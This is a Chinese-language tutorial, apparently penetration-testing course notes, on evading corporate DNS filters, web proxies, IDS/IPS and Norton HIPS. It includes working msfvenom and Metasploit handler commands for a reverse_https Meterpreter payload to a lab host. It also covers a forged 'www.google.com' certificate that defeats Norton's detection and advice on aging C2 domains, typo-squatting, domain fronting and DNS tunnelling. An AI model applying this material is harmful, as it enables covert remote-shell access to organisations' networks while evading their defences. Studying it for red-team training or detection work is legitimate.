# 网络过滤绕过 - 从零开始详解

## 概述

本文介绍企业网络中常见的防御系统以及如何绕过它们,包括DNS过滤、Web代理和IDS/IPS。

---

## 第一部分:企业网络防御架构

### 1.1 典型的边界防御架构

```
内部网络
    ↓
DNS过滤器 (域名过滤)
    ↓
内部防火墙 (IP/端口过滤)
    ↓
SSL检查设备 (解密/重加密)
    ↓
Web代理/IDS (深度包检测)
    ↓
外部防火墙
    ↓
互联网
```

### 1.2 各组件功能

| 组件 | 功能 |
|------|------|
| DNS过滤器 | 阻止恶意域名解析 |
| 内部防火墙 | 基于IP和端口过滤 |
| SSL检查 | 解密HTTPS流量进行检查 |
| Web代理 | 检查HTTP/HTTPS内容 |
| IDS/IPS | 深度包检测,签名匹配 |

## 第二部分:DNS过滤绕过

### 2.1 DNS过滤工作原理

DNS过滤器会:
1. 将请求的域名与黑名单比较
2. 检查域名分类(如"恶意软件"、"钓鱼")
3. 返回阻止页面或sinkhole IP

### 2.2 OpenDNS示例

```bash
# 使用Google DNS(不过滤)
nslookup www.internetbadguys.com 8.8.8.8
# 返回: 67.215.92.210

# 使用OpenDNS(过滤)
nslookup www.internetbadguys.com 208.67.222.222
# 返回: 146.112.61.108 (sinkhole)
```

### 2.3 绕过策略

**1. 提前准备域名**
- 不要使用新注册的域名(会被标记为"新域名")
- 提前几周注册并生成流量

**2. 域名分类**
- 在域名上托管合法内容(如博客)
- 提交域名分类请求

**3. 域名选择**
- 使用看起来合法的域名
- 避免随机字符
- 考虑typo-squatting(如examp1e.com)

**4. 检查IP信誉**
- 使用VirusTotal检查C2服务器IP
- 避免使用被标记的共享主机

### 2.4 域名分类检查

```
OpenDNS: https://domain.opendns.com/
Symantec: https://sitereview.bluecoat.com/
IPVoid: https://www.ipvoid.com/
```

## 第三部分:Web代理绕过

### 3.1 Web代理工作原理

```
客户端 → 代理服务器 → 目标网站
         ↓
    - 检查URL
    - 检查HTTP头
    - 记录日志
    - 可能修改内容
```

### 3.2 代理感知Payload

确保payload能够:
1. 检测本地代理设置
2. 通过代理连接而不是直连

**Meterpreter自动处理:** 使用`InternetSetOptionA` API

### 3.3 绕过策略

**1. 域名和URL**
- 确保域名分类安全
- 使用云服务域名(cloudfront.net, azurewebsites.net)

**2. User-Agent**
- 设置为目标组织使用的浏览器
- 避免使用异常的User-Agent

```
# Meterpreter设置User-Agent
set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36..."
```

**3. 遵循HTTP标准**
- 使用标准HTTP方法
- 包含正常的HTTP头

## 第四部分:IDS/IPS绕过

### 4.1 IDS vs IPS

| 特性 | IDS | IPS |
|------|-----|-----|
| 位置 | 旁路(被动) | 串联(主动) |
| 功能 | 只告警 | 可阻断流量 |
| 检测 | 签名匹配 | 签名匹配 |

### 4.2 签名检测原理

IDS/IPS通过签名匹配检测恶意流量:

**Meterpreter签名示例:**
```
POST /[4-5字符校验和]_[16字符随机] HTTP/1.1
...
RECV
```

**Cobalt Strike签名示例:**
```
HTTP/1.1 200 OK  ← 注意多余的空格
```

### 4.3 绕过策略

**1. 修改流量模式**
- 更改URI格式
- 修改HTTP头
- 使用自定义配置

**2. 使用自定义证书**

默认Meterpreter证书会被检测:
```
Issuer: CN=localhost, OU=qa, O=test, L=test, ST=test, C=US
```

**生成自定义证书:**
```bash
# 生成私钥和证书
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.google.com" \
    -keyout www.google.com.key \
    -out www.google.com.crt

# 合并为PEM文件
cat www.google.com.key www.google.com.crt > www.google.com.pem
```

**在Meterpreter中使用:**
```
set HandlerSSLCert /path/to/www.google.com.pem
set StagerVerifySSLCert true
```

## 第五部分:案例研究 - 绕过Norton HIPS

### 5.1 问题

Norton 360检测到标准Meterpreter HTTPS连接:
```
Alert: Meterpreter Reverse HTTPS
```

### 5.2 原因分析

Norton检测的是默认Meterpreter证书的签名:
```
Issuer: CN=localhost, OU=qa, O=test, L=test, ST=test, C=US
```

### 5.3 解决方案

**步骤1: 生成自定义证书**
```bash
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.google.com" \
    -keyout www.google.com.key \
    -out www.google.com.crt

cat www.google.com.key www.google.com.crt > www.google.com.pem
```

**步骤2: 配置Meterpreter**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.119.120
set LPORT 443
set HandlerSSLCert /home/kali/www.google.com.pem
set StagerVerifySSLCert true
exploit
```

**步骤3: 生成Payload**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.119.120 LPORT=443 \
    HttpUserAgent="Mozilla/5.0..." \
    StagerVerifySSLCert=true \
    HandlerSSLCert=/home/kali/www.google.com.pem \
    -f exe -o payload.exe
```

### 5.4 结果

使用自定义证书后,Norton不再检测到Meterpreter连接。

## 第六部分:高级技术

### 6.1 域前置(Domain Fronting)

利用CDN隐藏真实C2服务器:

```
客户端 → CDN(合法域名) → C2服务器
```

**原理:**
- TLS SNI使用合法域名(如cdn.microsoft.com)
- HTTP Host头使用C2域名
- CDN将请求转发到C2

### 6.2 DNS隧道

通过DNS协议传输数据:

```
客户端 → DNS查询(编码数据) → DNS服务器 → C2
```

**工具:**
- dnscat2
- iodine
- dns2tcp

## 常见问题

### Q1: 如何知道目标使用什么过滤?

- 社会工程
- 观察错误页面
- 测试不同类型的流量

### Q2: 如果域名被阻止怎么办?

- 准备多个备用域名
- 使用域前置
- 使用DNS隧道

### Q3: 如何避免日志分析检测?

- 模拟正常流量模式
- 使用合理的User-Agent
- 避免异常的连接频率
